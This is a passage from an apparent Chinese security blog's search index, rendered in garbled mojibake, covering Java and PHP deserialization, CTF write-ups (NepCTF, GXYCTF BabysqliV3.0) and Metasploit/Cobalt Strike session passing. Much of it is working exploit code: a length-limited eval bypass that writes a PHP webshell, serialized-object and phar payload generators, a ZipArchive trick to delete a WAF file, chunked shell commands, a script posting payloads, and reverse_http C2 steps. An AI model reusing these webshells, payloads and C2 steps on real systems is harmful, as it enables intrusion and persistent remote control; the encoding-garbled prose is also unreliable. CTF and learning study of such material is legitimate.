Javaè™šæ‹Ÿæœºåˆ¤æ–­æ˜¯å¦å…è®¸åºåˆ—åŒ–æ•°æ®è¢«åºåˆ—åŒ–æ—¶ï¼Œä¼šå–å†³äºä¸¤ä¸ªç±»çš„serialVersionUIDæ˜¯å¦ä¸€è‡´ã€‚serialVerionUIDåœ¨ä¸åŒç¼–è¯‘å™¨å†…å¯èƒ½æœ‰ä¸åŒçš„å€¼ï¼Œå¼€å‘è€…å¯ä»¥åœ¨ç›®æ ‡åºåˆ—åŒ–ç±»ä¸­æä¾›å›ºå®šå€¼ã€‚åœ¨æé«˜serialVerionUIDå›ºå®šå€¼çš„æƒ…å†µä¸‹ï¼Œåªè¦åºåˆ—åŒ–æ•°æ®ä¸­å›½çš„serialVerionUIDå’Œç›®æ ‡åºåˆ—åŒ–ç±»ä¸­çš„ä¸€è‡´å°±å¯ä»¥æˆåŠŸååºåˆ—åŒ–ã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šå€¼ï¼Œç¼–è¯‘å™¨ä¼šæ ¹æ®classæ–‡ä»¶å†…å®¹é€šè¿‡ä¸€å®šç®—æ³•ç”Ÿæˆå€¼ï¼Œåœ¨ä¸åŒç¯å¢ƒä¸‹ï¼Œç¼–è¯‘å™¨å¾—åˆ°çš„serialVerionUIDå€¼ä¸åŒï¼Œå°±ä¼šå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ã€‚æ”¹å˜ç›®æ ‡ç±»ä¸­ä»£ç ä¹Ÿå¯èƒ½ä¼šå½±å“ç”Ÿæˆçš„serialVersionUIDï¼Œæ­¤æ—¶ä¼šæŠ›å‡ºjava.io.InvalidClassExceptionå¹¶æŒ‡å‡ºserialVersionUIDä¸ä¸€è‡´ã€‚å»ºè®®åœ¨ç›®æ ‡åºåˆ—åŒ–ç±»ä¸­æ˜¾ç¤ºå®šä¹‰serialVersionUIDå¹¶èµ‹äºˆæ˜ç¡®çš„å€¼ã€‚ æ˜¾ç¤ºå®šä¹‰serialVersionUIDæœ‰ä¸¤ç§ç”¨é€”ï¼š 1.åœ¨æŸäº›åœºåˆï¼Œå¸Œæœ›ç±»çš„ä¸åŒç‰ˆæœ¬å…¼å®¹åºåˆ—åŒ–ï¼Œæ‰€ä»¥éœ€è¦ç¡®ä¿ç±»çš„ä¸åŒç‰ˆæœ¬æœ‰ç›¸åŒçš„serialVersionUID 2.æŸäº›æ—¶å€™ä¸å¸Œæœ›ç±»çš„ä¸åŒç‰ˆæœ¬å¯¹åºåˆ—åŒ–æœ‰å…¼å®¹ï¼Œæ‰€ä»¥éœ€è¦ç±»çš„ä¸åŒç‰ˆæœ¬æœ‰ä¸åŒçš„serialVerionUID ååºåˆ—åŒ–æ¼æ´javaæœ‰å¤šç§åºåˆ—åŒ–å’Œååºåˆ—åŒ–å·¥å…· 123JDKè‡ªå¸¦çš„Serializablefastjsonå’Œjacksonæ˜¯JSONçš„çŸ¥åååºåˆ—åŒ–å·¥å…·xmldecoderå’Œxstreamæ˜¯XMLçš„çŸ¥åååºåˆ—åŒ–å·¥å…· javaæ‹¥æœ‰å®Œå–„çš„ç¬¬ä¸‰æ–¹ç±»åº“å’Œæ»¡è¶³å„ç§éœ€æ±‚çš„æ¡†æ¶ï¼Œä½†å› ä¸ºå¾ˆå¤šç¬¬ä¸‰æ–¹ç±»åº“å¼•ç”¨å¹¿æ³›ï¼Œå¦‚æœå…¶ä¸­æŸäº›ç»„ä»¶å‡ºç°å®‰å…¨é—®é¢˜ï¼Œé‚£ä¹ˆå—å½±å“èŒƒå›´å°†æä¸ºå¹¿æ³›ã€‚ æ¼æ´å…¥å£ObjectInputStreamå¯¹è±¡çš„readObjectå‡½æ•°è°ƒç”¨æ˜¯javaååºåˆ—åŒ–æµç¨‹çš„å…¥å£ï¼Œåºåˆ—åŒ–æ•°æ®çš„æ¥æºåŒ…æ‹¬ï¼šCookieã€GETå‚æ•°ã€POSTå‚æ•°æˆ–è€…æµã€HTTP Headæˆ–è€…æ¥è‡ªç”¨æˆ·å¯æ§å†…å®¹çš„æ•°æ®åº“ç­‰ã€‚ è§¦å‘åœºæ™¯ï¼š 12341.HTTPè¯·æ±‚ä¸­çš„å‚æ•°2.RMIï¼Œå³Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œåœ¨RMIä¸­ä¼ è¾“çš„æ•°æ®çš†ä¸ºåºåˆ—åŒ–3.JMXï¼Œä¸€ä¸ªä¸ºåº”ç”¨ç¨‹åºæ¤å…¥ç®¡ç†åŠŸèƒ½çš„æ¡†æ¶4.è‡ªå®šä¹‰åè®® ç”¨æ¥æ¥æ”¶ä¸å‘é€åŸå§‹çš„javaå¯¹è±¡ ååºåˆ—åŒ–ç›¸å…³å‡½æ•° 1234567ObjectInputStream.readObjectObjectInputStream.readUnsharedXMLDecoder.readObjectYaml.loadXStream.fromXMLObjectMapper.readValueJSON.parseObject æ•°æ®ç‰¹å¾åºåˆ—åŒ–çš„æ•°æ®å¤´æ˜¯ä¸å˜çš„ï¼Œä¼ è¾“è¿‡ç¨‹ä¸­å¯èƒ½ä¼šå¯¹å­—èŠ‚æµè¿›è¡Œç¼–ç ï¼Œè§£ç åæŸ¥çœ‹å­—èŠ‚æµå¼€å¤´ï¼Œååºåˆ—åŒ–æ•°æ®å¼€å¤´åŒ…å«ä¸¤å­—èŠ‚çš„é­”æœ¯æ•°å­—ï¼Œåé¢æ˜¯ä¸¤å­—èŠ‚çš„ç‰ˆæœ¬å·ï¼Œå¦‚ac ed 00 05ï¼Œè€Œç»è¿‡Base64ç¼–ç è¿‡åºåˆ—åŒ–æ•°æ®çš„å­—èŠ‚æµå¤´éƒ¨ä¸ºRo0ABï¼Œåœ¨æ”»å‡»æ£€æµ‹æ—¶å¯é’ˆå¯¹è¯¥ç‰¹å¾è¿›è¡ŒåŒ¹é…è¯·æ±‚postä¸­æ˜¯å¦åŒ…å«ååºåˆ—åŒ–æ•°æ®ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºååºåˆ—åŒ–æ¼æ´æ”»å‡»ã€‚ åˆ©ç”¨å½¢å¼JDKåŸç”Ÿååºåˆ—åŒ–å·¥å…·Serializableå¤§è‡´æœ‰ä¸¤ç§åˆ©ç”¨å½¢å¼ 123451.å®Œæ•´å¯¹è±¡å‰çš„åˆ©ç”¨åœ¨JDKå¯¹æ¶æ„åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è¾¾æˆæ”»å‡»æ•ˆæœï¼Œè¿™ç§åˆ©ç”¨æ–¹å¼å¤§å¤šåŸºäºå¯¹javaå¼€å‘ä¸­é¢‘ç¹è°ƒç”¨å‡½æ•°çš„ç†è§£ï¼Œå¯»æ‰¾æ¼æ´è§¦å‘ç‚¹ã€‚ä¾‹å¦‚commons-collections3.1ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ä¸­çš„rce gadgetå±äºä»¥readObjectå‡½æ•°è°ƒç”¨ç‚¹ä¸ºå…¥å£ï¼Œç›´æ¥åœ¨ä¾èµ–åŒ…ä¸­å¯»æ‰¾åˆ°rceçš„åˆ©ç”¨æ–¹å¼2.ç”Ÿæˆå®Œæ•´å¯¹è±¡çš„åˆ©ç”¨å¦‚èº«ä»½ä»¤ç‰Œååºåˆ—åŒ–ï¼Œè¦ç­‰å¾…å¯¹è±¡ååºåˆ—åŒ–å®Œæˆåï¼Œåˆ©ç”¨å…¶ä¸­çš„å‡½æ•°æˆ–è€…å±æ€§å€¼å®Œæˆæ”»å‡»","link":"/2021/04/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"},{"title":"msfå’Œcsè”åŠ¨","text":"csæ´¾ç”Ÿç»™msfé…ç½®å¥½listenerï¼Œé€‰æ‹©Foreign HTTP ä½¿ç”¨csçš„spawnåŠŸèƒ½ msfè®¾ç½®payloadä¸º/windows/meterpreter/reverse_httpï¼Œipå’Œç«¯å£ä¸listenerä¸­çš„ä¸€è‡´ï¼Œä¸è¦ä½¿ç”¨64ä½çš„payloadï¼Œä¼šå‡ºç°é—®é¢˜ã€‚è¿™æ ·å³å¯æ¥æ”¶åˆ°æ´¾ç”Ÿè¿‡æ¥çš„session msfæ´¾ç”Ÿç»™csåªæœ‰meterpreterç±»å‹çš„sessionæ‰èƒ½æ´¾ç”Ÿç»™cs ä½¿ç”¨msfä¸­çš„windows/local/payload_injectæ¨¡å—ï¼Œè®¾ç½®payloadä¸ºwindows/meterpreter/reverse_httpï¼Œipå’Œç«¯å£å¡«å†™csç›‘å¬çš„ipå’Œç«¯å£ï¼Œå†æŒ‡å®šã€‚è®¾ç½®iDisablePayloadHandlerä¸ºtrueï¼Œå› ä¸ºpayload_injectæ‰§è¡Œåä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„handlerï¼Œä½†æ˜¯æˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªï¼Œæ‰€ä»¥ä¸éœ€è¦å®ƒã€‚æ‰§è¡Œåå³å¯å†csä¸­çœ‹åˆ°ä¸Šçº¿çš„æœºå™¨ã€‚","link":"/2021/03/11/msf%E5%92%8Ccs%E8%81%94%E5%8A%A8/"},{"title":"nepctféƒ¨åˆ†wp","text":"little_trické•¿åº¦é™åˆ¶rce 1234567891011&lt;?php error_reporting(0); highlight_file(__FILE__); $nep = $_GET['nep']; $len = $_GET['len']; if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13){ eval(substr($nep,0,$len)); }else{ die('too long!'); }?&gt; ä¼ å…¥è´Ÿæ•°å³å¯ç»•è¿‡ ç›´æ¥echoå†™é©¬ 1http://node4.hackingfor.fun:34567/052e4d95576306a511b353cae5aec562/?len=-1&amp;nep=`$_GET[1]`;1&amp;1=echo \\&lt;?php eval\\(\\$_POST\\[1\\]\\)\\;&gt;2.php å®é™…æ‰§è¡Œå‘½ä»¤ 12345echo \\&lt;?php eval\\(\\$_POST\\[1\\]\\)\\;&gt;2.phpecho eval\\(&gt;&gt;2.phpecho \\$_POST&gt;&gt;2.phpecho \\[1\\]&gt;&gt;2.phpecho \\)\\;&gt;&gt;2.php èšå‰‘è¿æ¥æ‹¿åˆ°flag æ¢¦å›ç‰¡ä¸¹äº­ååºåˆ—åŒ– 1.Gameç±»çš„__destructæ–¹æ³•è°ƒç”¨checking å±æ€§choiceç­‰äºloginç±»,å±æ€§usernameå’Œpasswordç­‰äºadminï¼Œå±æ€§registerç­‰äºadmin 2.loginç±»çš„checkingæ–¹æ³•è°ƒç”¨openï¼Œè¿™äº›å±æ€§åœ¨Gameç±»ä¸­èµ‹å€¼ï¼šå±æ€§fileç­‰äºOpenç±»ï¼Œå±æ€§filenameç­‰äºshell.php 3.æœ€ç»ˆæ‰§è¡Œopenç±»çš„openæ–¹æ³• 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phphighlight_file(__FILE__);error_reporting(0);include('shell.php');class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&gt;username='user'; $this-&gt;password='user'; } public function __wakeup(){ if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;){ //admin $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); }else{ $this-&gt;choice = new register(); } } public function __destruct() { $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); }}class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; } public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){ $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die('login success you can to open shell file!'); } }}class register{ public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){ die('success register admin'); }else{ die('please register admin '); } }}class Open{ function open($filename, $content){ if(!file_get_contents('waf.txt')){ shell($content); }else{ echo file_get_contents($filename.&quot;.php&quot;); //ç»ˆç‚¹ } }}if($_GET['a']!==$_GET['b']&amp;&amp;(md5($_GET['a']) === md5($_GET['b'])) &amp;&amp; (sha1($_GET['a'])=== sha1($_GET['b']))){ // @unserialize(base64_decode($_POST['unser']));} æ„é€ expè¯»å–shell.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content;}class login{ public $file; public $filename; public $content;}class register{}class Open{}$a=new Game();$b=new Open();$a-&gt;register='admin';$a-&gt;file=$b;$a-&gt;filename='shell';$a-&gt;username='admin';$a-&gt;password='admin';echo base64_encode(serialize($a));//$b=new login(); 12345678910111213//shell.php&lt;?phpfunction shell($cmd){ if(strlen($cmd)&lt;10){ if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/',$cmd)){ die(&quot;NO&quot;); }else{ return system($cmd); } }else{ die('so long!'); }}login success you can to open shell file! å¯ä»¥çœ‹åˆ°å¿…é¡»åˆ é™¤æ‰waf.txtæ‰èƒ½è°ƒç”¨shellæ–¹æ³• 123456789class Open{ function open($filename, $content){ if(!file_get_contents('waf.txt')){ shell($content); }else{ echo file_get_contents($filename.&quot;.php&quot;); } }} åœ¨è¿™ä¸ªåœ°æ–¹èŠ±è´¹äº†å¾ˆé•¿æ—¶é—´ï¼Œä¸€å¼€å§‹çš„æ€è·¯æ˜¯åˆ©ç”¨ä¼ªåè®®æ¥æ“ä½œæ–‡ä»¶ï¼Œä½†æ˜¯ä¼ªåè®®ä¸èƒ½åšåˆ°åˆ é™¤æ–‡ä»¶ã€‚åæ¥æƒ³åˆ°å¯ä»¥åˆ©ç”¨åŒåæ–¹æ³•ï¼ŒæŸ¥phpå†…ç½®ç±»çš„æ—¶å€™å‘ç°ZipArchiveç±»æœ‰openæ–¹æ³• 1234567public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){ $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die('login success you can to open shell file!'); } } æ„é€ åˆ é™¤æ–‡ä»¶exp 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpclass Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content;}class login{ public $file; public $filename; public $content;}class register{}class Open{}$a=new Game();$b=new ZipArchive();$a-&gt;content=ZipArchive::OVERWRITE;$a-&gt;register='admin';$a-&gt;file=$b;$a-&gt;filename='waf.txt';$a-&gt;username='admin';$a-&gt;password='admin';echo base64_encode(serialize($a));//$b=new login(); åˆ é™¤æˆåŠŸ æ¥ä¸‹æ¥å¯ä»¥è°ƒç”¨shellæ–¹æ³•äº†ï¼Œé™åˆ¶é•¿åº¦ä¸º10ä½å­—ç¬¦ï¼Œå¯ä»¥é‡‡ç”¨è¿½åŠ å†…å®¹çš„æ–¹å¼å†™å…¥shell 12345678910111213//shell.php&lt;?phpfunction shell($cmd){ if(strlen($cmd)&lt;10){ if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/',$cmd)){ die(&quot;NO&quot;); }else{ return system($cmd); } }else{ die('so long!'); }}login success you can to open shell file! ä¸ºäº†é˜²æ­¢å‡ºç°&lt;?è¿™ç§ç‰¹æ®Šå­—ç¬¦ï¼ŒæŠŠå†…å®¹å…ˆbase64ç¼–ç åå†å†™å…¥ 12//&lt;?php eval($_GET[1]);echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php æŠŠæ–‡ä»¶å†…å®¹åˆ†å‰²åå†™å…¥åˆ°æ–‡ä»¶åä¸­ï¼Œå› ä¸ºå†™å…¥æ—¶é—´é¡ºåºçš„åŸå› æ‰€ä»¥éœ€è¦æŠŠå‘½ä»¤å€’åºå†™å…¥ï¼Œls -tè¡¨ç¤ºæŠŠæ–‡ä»¶åæŒ‰ç…§æ—¶é—´æ’åºï¼ŒæŠŠæ‰€æœ‰æ–‡ä»¶åå†™å…¥åˆ°0è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œç„¶åsh 0æ‰§è¡Œecho PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.phpå†™å…¥æ–‡ä»¶ 1234567891011121314151617181920w&gt;hpw&gt;1.p\\\\w&gt;d\\&gt;\\\\w&gt;\\ -\\\\w&gt;e64\\\\w&gt;bas\\\\w&gt;7\\|\\\\w&gt;XSk\\\\w&gt;Fsx\\\\w&gt;dFV\\\\w&gt;kX0\\\\w&gt;bCg\\\\w&gt;XZh\\\\w&gt;AgZ\\\\w&gt;waH\\\\w&gt;PD9\\\\w&gt;o\\ \\\\w&gt;ech\\\\ls -t&gt;0sh 0 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpclass Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content;}class login{ public $file; public $filename; public $content;}class register{}class Open{}$a=new Game();$b=new Open();$a-&gt;register='admin';$a-&gt;content='w&gt;e64\\\\';$a-&gt;file=$b;$a-&gt;filename='shell';$a-&gt;username='admin';$a-&gt;password='admin';echo base64_encode(serialize($a));//$b=new login(); å‘½ä»¤æœ‰ç‚¹é•¿ï¼Œå†™äº†ä¸ªè„šæœ¬åˆ©ç”¨ï¼Œé¦–å…ˆæ–°å»ºäºŒåä¸ªphpæ–‡ä»¶ï¼Œä¿®æ”¹contentå±æ€§ä¸ºå¯¹åº”çš„å‘½ä»¤ï¼Œç„¶åç”Ÿæˆpayloadå†å‘èµ·è¯·æ±‚ 1234567891011import requestsfor i in range(1,21): localurl='http://localhost/ctf/1/%d.php' %i r=requests.get(localurl) payload=r.text #print(payload) data={'unser':payload} r=requests.post(url='http://cf614f52-155c-4be7-b52b-8ab7d0076465.node1.hackingfor.fun/?a[]=1&amp;b[]=2',data=data) print(r.status_code) æ‹¿åˆ°flag 1http://cf614f52-155c-4be7-b52b-8ab7d0076465.node1.hackingfor.fun/1.php?1=system(%22cat%20/flag%22);","link":"/2021/03/23/nepctf%E9%83%A8%E5%88%86wp/"},{"title":"pharååºåˆ—åŒ–å­¦ä¹ ","text":"pharæ–‡ä»¶ç»“æ„åˆ†æ å¤§ä½“æ¥è¯´ Phar ç»“æ„ç”±4éƒ¨åˆ†ç»„æˆ 1.stub ï¼špharæ–‡ä»¶æ ‡è¯† 12345&lt;?phpPhar::mapPhar();include 'phar://phar.phar/index.php';__HALT_COMPILER();?&gt; å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸ºxxx&lt;?php xxx; __HALT_COMPILER();?&gt;ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥__HALT_COMPILER();?&gt;æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬ç•™ä¸‹è¿™ä¸ªæ ‡å¿—ä½ï¼Œæ„é€ ä¸€ä¸ªå›¾ç‰‡æˆ–è€…å…¶ä»–æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥ç»•è¿‡ä¸Šä¼ é™åˆ¶ï¼Œå¹¶ä¸”è¢« phar è¿™å‡½æ•°è¯†åˆ«åˆ©ç”¨ã€‚ 2. a manifest describing the contents pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚ 3. the file contents è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚ 4. [optional] a signature for verifying Phar integrity (phar file format only) ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼Œæ ¼å¼å¦‚ä¸‹ åˆ©ç”¨æŠŠä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ï¼Œå‚¨å­˜åœ¨pharæ ¼å¼çš„æ–‡ä»¶ä¸­ï¼Œç”Ÿæˆåçš„æ–‡ä»¶å¯ä»¥ä»¥ä»»æ„æ ¼å¼ä¿å­˜ï¼Œé€šè¿‡æ–‡ä»¶åŒ…å«å‡½æ•°ï¼ˆä¸‹å›¾ï¼‰ï¼Œç”¨phar://åè®®åŒ…å«æ–‡ä»¶ï¼Œå°±å¯ä»¥æŠŠå¯¹è±¡ååºåˆ—åŒ–ã€‚phpä¸­å¤§éƒ¨åˆ†æ–‡ä»¶å‡½æ•°åœ¨é€šè¿‡phar://è§£æpharæ–‡ä»¶æ—¶ï¼Œä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œå—å½±å“çš„å‡½æ•°å¦‚ä¸‹ï¼š åˆ©ç”¨åŸç† 12345678910&lt;?phpclass test{ public function __destruct() { echo 'destructed'; }}$filename='phar://phar.phar/test.txt';file_get_contents($filename);?&gt; ä¾‹é¢˜[GXYCTF2019]BabysqliV3.0åˆ©ç”¨æ€è·¯ï¼š$this-&gt;Filenameå¯æ§ï¼Œä»GETå‚æ•°nameä¸­è·å–ã€‚Uploaderç±»ä¸­çš„__toString()æ–¹æ³•è¿”å›$this-&gt;Filenameï¼Œæœ€åçš„flie_get_contentså‚æ•°å®é™…å¯ç›´æ¥ä»nameå‚æ•°è·å–ï¼Œè¿™æ ·å°±å¯ä»¥ç”¨phar://è§¦å‘ååºåˆ—åŒ–ã€‚æ­¤å¤–è¿˜éœ€è¦æ»¡è¶³æ¡ä»¶$this-&gt;token ç­‰äº$_SESSION['user']ï¼Œ$_SESSION['user']å¯ä»æ–‡ä»¶åä¸­è·å¾—ã€‚æœ€åæ„é€ phar://åŒ…å«æ–‡ä»¶ã€‚ å¼€å§‹ç”¨å¼±å£ä»¤admin passwordç™»é™† å¼±å£ä»¤ç™»é™†è¿›å»ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰ç»™å‡ºè¿”å›è·¯å¾„ï¼Œè§‚å¯Ÿåˆ°fileå‚æ•°å¯èƒ½å¯ä»¥åˆ©ç”¨ åªè¦å‚æ•°ä¸­ä¸ä»¥homeå’Œuploadç»“å°¾å°±ä¼šè‡ªåŠ¨æŠŠåç¼€åæ”¹æˆcc.fxxkyou! åˆ©ç”¨php://filterè¯»å–æ–‡ä»¶æºç  1http://bf4bee72-3946-49dc-b598-48b3dc0ac6aa.node3.buuoj.cn/home.php?file=php://filter/read=convert.base64-encode/resource=upload 123456789101112131415161718192021222324252627//home.php&lt;?phpsession_start();echo &quot;&lt;meta http-equiv=\\&quot;Content-Type\\&quot; content=\\&quot;text/html; charset=utf-8\\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;error_reporting(0);if(isset($_SESSION['user'])){ if(isset($_GET['file'])){ if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET['file'])){ die(&quot;hacker!&quot;); } else{ if(preg_match(&quot;/home$/i&quot;, $_GET['file']) or preg_match(&quot;/upload$/i&quot;, $_GET['file'])){ $file = $_GET['file'].&quot;.php&quot;; } else{ $file = $_GET['file'].&quot;.fxxkyou!&quot;; } echo &quot;Ã¥Â½Â“Ã¥Â‰ÂÃ¥Â¼Â•Ã§Â”Â¨Ã§ÂšÂ„Ã¦Â˜Â¯ &quot;.$file; require $file; } } else{ die(&quot;no permission!&quot;); }}?&gt; åˆ©ç”¨æ€è·¯ï¼š$this-&gt;Filenameå¯æ§ï¼Œä»GETå‚æ•°nameä¸­è·å–ã€‚Uploaderç±»ä¸­çš„__toString()æ–¹æ³•è¿”å›$this-&gt;Filenameï¼Œæœ€åçš„flie_get_contentså‚æ•°å®é™…å¯ç›´æ¥ä»nameå‚æ•°è·å–ï¼Œè¿™æ ·å°±å¯ä»¥ç”¨phar://è§¦å‘ååºåˆ—åŒ–ã€‚æ­¤å¤–è¿˜éœ€è¦æ»¡è¶³æ¡ä»¶$this-&gt;token ç­‰äº$_SESSION['user']ï¼Œ$_SESSION['user']å¯ä»æ–‡ä»¶åä¸­è·å¾—ã€‚æœ€åæ„é€ phar://åŒ…å«æ–‡ä»¶ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374//upload.php&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; Ã¤Â¸ÂŠÃ¤Â¼ Ã¦Â–Â‡Ã¤Â»Â¶ &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Ã¤Â¸ÂŠÃ¤Â¼ &quot; /&gt;&lt;/form&gt;&lt;?phperror_reporting(0);class Uploader{ public $Filename; public $cmd; public $token; function __construct(){ $sandbox = getcwd().&quot;/uploads/&quot;.md5($_SESSION['user']).&quot;/&quot;; $ext = &quot;.txt&quot;; @mkdir($sandbox, 0777, true); if(isset($_GET['name']) and !preg_match(&quot;/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i&quot;, $_GET['name'])){ $this-&gt;Filename = $_GET['name']; } else{ $this-&gt;Filename = $sandbox.$_SESSION['user'].$ext; } $this-&gt;cmd = &quot;echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';&quot;; $this-&gt;token = $_SESSION['user']; } function upload($file){ global $sandbox; global $ext; if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)){ $this-&gt;cmd = &quot;die('illegal filename!');&quot;; } else{ if($file['size'] &gt; 1024){ $this-&gt;cmd = &quot;die('you are too big (Ã¢Â€Â²Ã¢Â–Â½`Ã£Â€Âƒ)');&quot;; } else{ $this-&gt;cmd = &quot;move_uploaded_file('&quot;.$file['tmp_name'].&quot;', '&quot; . $this-&gt;Filename . &quot;');&quot;; } } } function __toString(){ global $sandbox; global $ext; // return $sandbox.$this-&gt;Filename.$ext; return $this-&gt;Filename; } function __destruct(){ if($this-&gt;token != $_SESSION['user']){ $this-&gt;cmd = &quot;die('check token falied!');&quot;; } eval($this-&gt;cmd); }}if(isset($_FILES['file'])) { $uploader = new Uploader(); $uploader-&gt;upload($_FILES[&quot;file&quot;]); if(@file_get_contents($uploader)){ echo &quot;Ã¤Â¸Â‹Ã©ÂÂ¢Ã¦Â˜Â¯Ã¤Â½ Ã¤Â¸ÂŠÃ¤Â¼ Ã§ÂšÂ„Ã¦Â–Â‡Ã¤Â»Â¶Ã¯Â¼Âš&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;; echo file_get_contents($uploader); }}?&gt; ä¸Šä¼ txtæ–‡ä»¶ï¼Œå¾—åˆ°$_SESSION[â€˜userâ€™] æ„é€ expï¼Œç”Ÿæˆpharæ–‡ä»¶å¹¶ä¸Šä¼  12345678910111213141516171819202122&lt;?phpclass Uploader{ public $Filename; public $cmd='show_source(&quot;flag.php&quot;);'; public $token='GXY57eb0a54186eb32ad70deb2e3da0b903';}$phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub$a=new Uploader();$phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();?&gt; è¯»å–flag 1http://dc0a112a-07ab-4130-a0cc-497b03dde141.node3.buuoj.cn/home.php?file=upload&amp;name=phar:///var/www/html/uploads/ef30d6288c320cd6e01dc95841a44ad0/GXY57eb0a54186eb32ad70deb2e3da0b903.txt","link":"/2021/03/25/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"},{"title":"phpåŸç”Ÿç±»åˆ©ç”¨","text":"é€‚ç”¨åœºæ™¯åœ¨å­˜åœ¨ä»»æ„ç±»å®ä¾‹åŒ–æ¼æ´ä½†æ˜¯æ²¡æœ‰popé“¾çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å°è¯•åˆ©ç”¨åŸç”Ÿç±» GlobIteratorå¯ä»¥åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶å é€‚ç”¨ç‰ˆæœ¬ï¼šphp5.3.* php 7 ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šæœç´¢çš„è·¯å¾„å’Œç±»å‹ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºé€‰æ‹©æ–‡ä»¶çš„å“ªä¸ªä¿¡æ¯ä½œä¸ºé”®å 1$newclass = new GlobIterator('./*.php',0); 12345678&lt;?php$iterator = new GlobIterator(__DIR__ . './*.php');while ($iterator-&gt;valid()) { echo $iterator-&gt;current()-&gt;getFilename() . '&lt;/br&gt;'; $iterator-&gt;next();}?&gt; 